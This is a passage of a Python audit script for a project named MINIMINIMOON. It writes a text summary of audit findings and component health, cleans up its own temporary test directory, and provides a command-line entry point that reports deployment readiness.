        # Also save a human-readable summary
        summary_path = output_path.with_suffix(".txt")
        self._save_human_readable_summary(report, summary_path)
        self.logger.info("📄 Summary saved to: %s", summary_path)

        return report

    def _save_human_readable_summary(self, report: dict, output_path: Path):
        """Generate human-readable text summary."""
        with open(output_path, "w", encoding="utf-8") as f:
            f.write("=" * 80 + "\n")
            f.write("MINIMINIMOON SYSTEM AUDIT REPORT\n")
            f.write("=" * 80 + "\n\n")

            # Metadata
            f.write(f"Audit Date: {report['audit_metadata']['timestamp']}\n")
            f.write(f"Duration: {report['audit_metadata']['duration_seconds']}s\n")
            f.write(f"Version: {report['audit_metadata']['version']}\n\n")

            # Summary
            summary = report["summary"]
            f.write("-" * 80 + "\n")
            f.write("EXECUTIVE SUMMARY\n")
            f.write("-" * 80 + "\n")
            f.write(f"Health Score: {summary['health_score']}/100\n")
            f.write(
                f"Deployment Ready: {'✅ YES' if summary['deployment_ready'] else '❌ NO'}\n"
            )
            f.write(f"Total Findings: {summary['total_findings']}\n\n")

            f.write("Findings by Severity:\n")
            for severity in ["critical", "high", "medium", "low", "info"]:
                count = summary["by_severity"].get(severity, 0)
                if count > 0:
                    f.write(f"  {severity.upper()}: {count}\n")

            # Critical Blockers
            if summary["critical_blockers"]:
                f.write("\n" + "-" * 80 + "\n")
                f.write("CRITICAL BLOCKERS (Must Fix Before Deployment)\n")
                f.write("-" * 80 + "\n")
                for i, blocker in enumerate(summary["critical_blockers"], 1):
                    f.write(f"{i}. [{blocker['component']}] {blocker['issue']}\n")

            # Component Health
            f.write("\n" + "-" * 80 + "\n")
            f.write("COMPONENT HEALTH STATUS\n")
            f.write("-" * 80 + "\n")

            for comp_name, health in self.component_health.items():
                status_emoji = {
                    "healthy": "✅",
                    "degraded": "⚠️",
                    "failed": "❌",
                    "missing": "🚫",
                }.get(health.status, "❓")

                f.write(f"{status_emoji} {comp_name}: {health.status.upper()}\n")
                if health.errors:
                    for error in health.errors:
                        f.write(f"    ERROR: {error}\n")
                if health.warnings:
                    for warning in health.warnings[:3]:  # Show first 3
                        f.write(f"    WARNING: {warning}\n")

            # All Findings
            f.write("\n" + "-" * 80 + "\n")
            f.write("DETAILED FINDINGS\n")
            f.write("-" * 80 + "\n\n")

            findings_by_severity = defaultdict(list)
            for finding in self.findings:
                findings_by_severity[finding.severity.value].append(finding)

            for severity in ["critical", "high", "medium", "low", "info"]:
                findings = findings_by_severity.get(severity, [])
                if findings:
                    f.write(
                        f"\n{severity.upper()} SEVERITY ({len(findings)} findings):\n"
                    )
                    f.write("-" * 80 + "\n")

                    for i, finding in enumerate(findings, 1):
                        f.write(f"\n{i}. [{finding.component}] {finding.issue}\n")
                        f.write(f"   Category: {finding.category.value}\n")
                        if finding.recommendation:
                            f.write(f"   Recommendation: {finding.recommendation}\n")
                        if finding.impact:
                            f.write(f"   Impact: {finding.impact}\n")

    def cleanup(self):
        """Clean up temporary test directory."""
        try:
            if self.test_dir.exists():
                shutil.rmtree(self.test_dir)
                self.logger.info("Cleaned up test directory: %s", self.test_dir)
        except Exception as e:
            self.logger.warning("Failed to clean up test directory: %s", e)


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================


def main():
    """Main entry point for audit script."""
    import argparse

    parser = argparse.ArgumentParser(
        description="MINIMINIMOON Advanced System Audit & Diagnostics Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python audit.py                          # Run full audit with defaults
  python audit.py --config-dir ./configs  # Custom config directory
  python audit.py --quiet                  # Minimal output
  python audit.py --output results.json   # Custom output file
        """,
    )

    parser.add_argument(
        "--config-dir",
        type=Path,
        default=Path("config"),
        help="Configuration directory (default: config/)",
    )

    parser.add_argument(
        "--orchestrator",
        type=Path,
        default=Path("miniminimoon_orchestrator.py"),
        help="Path to orchestrator file (default: miniminimoon_orchestrator.py)",
    )

    parser.add_argument(
        "--output",
        type=Path,
        default=Path("audit_report.json"),
        help="Output report path (default: audit_report.json)",
    )

    parser.add_argument("--quiet", action="store_true", help="Reduce console output")

    parser.add_argument(
        "--no-parallel", action="store_true", help="Disable parallel execution"
    )

    args = parser.parse_args()

    # Create auditor
    auditor = MiniMiniMoonAuditor(
        config_dir=args.config_dir,
        orchestrator_path=args.orchestrator,
        verbose=not args.quiet,
        parallel=not args.no_parallel,
    )

    try:
        # Run audit and save report
        report = auditor.save_report(output_path=args.output)

        # Print summary to console
        print("\n" + "=" * 80)
        print("AUDIT SUMMARY")
        print("=" * 80)
        summary = report["summary"]
        print(f"Health Score: {summary['health_score']}/100")
        print(
            f"Deployment Ready: {'✅ YES' if summary['deployment_ready'] else '❌ NO'}"
        )
        print(f"Total Findings: {summary['total_findings']}")
        print(f"  - Critical: {summary['by_severity'].get('critical', 0)}")
        print(f"  - High: {summary['by_severity'].get('high', 0)}")
        print(f"  - Medium: {summary['by_severity'].get('medium', 0)}")
        print(f"  - Low: {summary['by_severity'].get('low', 0)}")

        if summary["critical_blockers"]:
            print("\n⚠️  CRITICAL BLOCKERS:")
            for blocker in summary["critical_blockers"]:
                print(f"  - [{blocker['component']}] {blocker['issue']}")

        print(f"\n📄 Full report: {args.output}")
        print(f"📄 Summary: {args.output.with_suffix('.txt')}")

        # Exit with appropriate code
        if summary["deployment_ready"]:
            print("\n✅ System is ready for deployment!")
            sys.exit(0)
        else:
            print("\n❌ System has critical issues. Fix blockers before deployment.")
            sys.exit(1)

    except Exception as e:
        print(f"\n❌ Audit failed: {e}", file=sys.stderr)
        traceback.print_exc()
        sys.exit(2)
    finally:
        auditor.cleanup()


if __name__ == "__main__":
    main()
